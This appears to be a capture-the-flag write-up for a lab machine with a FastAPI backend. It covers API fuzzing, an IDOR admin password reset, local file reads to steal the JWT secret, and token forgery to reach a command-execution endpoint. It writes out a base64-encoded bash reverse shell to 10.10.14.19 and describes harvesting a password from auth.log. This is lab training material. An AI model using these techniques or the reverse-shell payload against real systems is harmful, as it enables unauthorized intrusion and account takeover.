# external scan
```
Nmap scan report for 10.10.11.161
Host is up (0.086s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    uvicorn
|_http-server-header: uvicorn
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     date: Mon, 13 Jun 2022 04:48:25 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Mon, 13 Jun 2022 04:48:13 GMT
|     server: uvicorn
|     content-length: 29
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC API Version 1.0"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Mon, 13 Jun 2022 04:48:19 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
```


# API portal
We start by navigating to the url where we notice there's a backend API running with no real front end
![[Pasted image 20220612175503.png]]

In order to fuzz an API we can use feroxbuster, this works better than a lot of the typical directory brute-force tools. This allows us to investigate by utilizing both POST and GET requests as APIs are typically coded to give different response depending on which method is used.

![[Pasted image 20220612202435.png]]

`feroxbuster -u http://10.10.11.161/ --force-recursion -C 404,405 -m GET,POST -w ~/tools/words/SecLists/Discovery/Web-Content/raft-small-words.txt`

We eventually find the following endpoint:
`http://10.10.11.161/api/v1/user/signup`
We also can investigate a number of users which are already created
`http://10.10.11.161/api/v1/user/1`

Interestingly, since this is an API http://10.10.11.161/api/v1/user will yield a 404 however you are still able to traverse the directory to reach other endpoints.

From there we just need to craft a POST request to the signup endpoint and include the requested JSON data. 

![[Pasted image 20220612210410.png]]

We can now login, this time including our username and password in the more typical x-www-form-urlencoded format.

![[Pasted image 20220612210343.png]]

Once logged in we see we've been issued an access token in the form of a JWT which we can use to access the /docs endpoint
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU1Nzk5MjE2LCJpYXQiOjE2NTUxMDgwMTYsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiMDNkNDE4OGMtY2NjZS00MzQ2LThhMDctNmMwZjI0ZTkxODlmIn0.f0Z-HroTREtGBBqJnDNUmNnKru_B4VdQWwQxVr9HYVY`

Burp Suit was hanging when trying to access the /docs endpoint with the jwt but curl was working fine

![[Pasted image 20220612222440.png]]

We can also use the firefox extension simple-modify-headers with no URL specified in order to correctly follow redirects.
![[Pasted image 20220612222558.png]]


From there we gain access to the /docs endpoint with a number of controls.
![[Pasted image 20220612235044.png]]
Scrolling down we can see the dropdown marked "/api/v1/user/SecretFlagEndpoint Get Flag"


# root flag
In order to get root we first must abuse a misconfiguration which allows us to modify the admin password by obtaining the GUID through an IDOR present on the /docs page

![[Pasted image 20220613001509.png]]

We can now use this guid to request a password change
![[Pasted image 20220613001819.png]]

To obtain root we now we move on to two more endpoints present on the API. The first, /admin/file, allows us to retrieve files on the system and the second is /admin/exec which allows  code execution. Unfortunately, the /admin/exec endpoint requires the "debug" flag to be present in our JWT. For this we will need to modify our current JWT via https://jwt.io/ and to do this we will need the token secret which can probably be found somewhere on the file system.

Whenever an LFI is encountered on a linux system its usually a good idea to enumerate the /proc folder, for this example /proc/self/environ proves helpful in orientating us on the box.

![[Pasted image 20220613003216.png]]

Here we see the name of the app module as it appears on the filesystem and the current working directory. These two allow us to read app/main.py, the source code for the application.

As the source code is transmitted via json we can use cyber chef to clean it up a bit.

![[Pasted image 20220613004139.png]]

![[Pasted image 20220613004155.png]]

In the source we spot that during import a file named "config.py" is called, this is found in the /app/core directoy. (note that during import python denotes directories with . and drops the file extension)
![[Pasted image 20220613004927.png]]

We once again use our LFI to grab this config file and upon inspection we find the JWT secret

![[Pasted image 20220613005611.png]]

![[Pasted image 20220613005526.png]]
We can now head back over to http://jwt.io and edit our admin token, adding the required debug field. This should allow us to utilize the /admin/exec endpoint.

![[Pasted image 20220613005933.png]]

Burp was still hanging trying to access with the token but curl was working fine
![[Pasted image 20220613010526.png]]
An even easier route would be to use the web portal with a base64 encoded reverse shell. 
create payload:
`echo 'bash -i >& /dev/tcp/10.10.14.19/9000 0>&1' | base64 `
and craft payload for submission via command section of the web portal:
`echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOS85MDAwIDA+JjEK" | base64 -d| bash`

![[Pasted image 20220613113340.png]]

![[Pasted image 20220613113424.png]]
once on the box we see an auth.log file which is interesting, upon inspection we see a login failure for a user with a strange name
![[Pasted image 20220613113823.png]]
A good practice when anlysing log files is to make note of any failures with unique or interesting names and use them for passwords. In this case it looks like the admin user mistakenly entered their password when their username was requested. 

